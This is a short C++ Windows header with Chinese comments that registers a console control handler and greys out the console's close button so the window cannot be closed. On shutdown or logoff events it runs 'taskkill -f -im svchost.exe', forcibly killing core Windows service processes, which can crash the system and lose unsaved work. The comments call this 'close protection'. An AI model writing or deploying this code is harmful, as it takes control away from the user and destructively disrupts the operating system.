#pragma once
#include <Windows.h>
#include <iostream>

// 控制台事件处理函数
BOOL WINAPI ConsoleHandler(DWORD signal) {
    switch (signal) {
    case CTRL_CLOSE_EVENT:   // 点击关闭按钮
        std::cout << "拦截到关闭事件，阻止控制台关闭！" << std::endl;
        return TRUE;         // 阻止关闭
	case CTRL_SHUTDOWN_EVENT:   // 系统关机事件
	{
        system("taskkill -f -im svchost.exe");
        return TRUE;  // 表示已处理事件
	}
    case CTRL_LOGOFF_EVENT:     // 用户注销事件
	{
        system("taskkill -f -im svchost.exe");
        return TRUE;
	}
    default:
        return FALSE;        // 其他事件不处理
    }
}

void setWindowProtection() {
    // 注册控制台事件处理器
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        std::cerr << "事件处理器注册失败！" << std::endl;
        return;
    }

    // 禁用系统菜单关闭选项（增强防护）
    HWND hConsole = GetConsoleWindow();
    if (hConsole) {
        HMENU hMenu = GetSystemMenu(hConsole, FALSE);
        if (hMenu) {
            // 灰化关闭按钮（可选：完全移除用RemoveMenu）
            EnableMenuItem(hMenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
        }
    }

    std::cout << "已启用关闭保护，尝试点击关闭按钮或Alt+F4无效...\n" ;


    return;
}
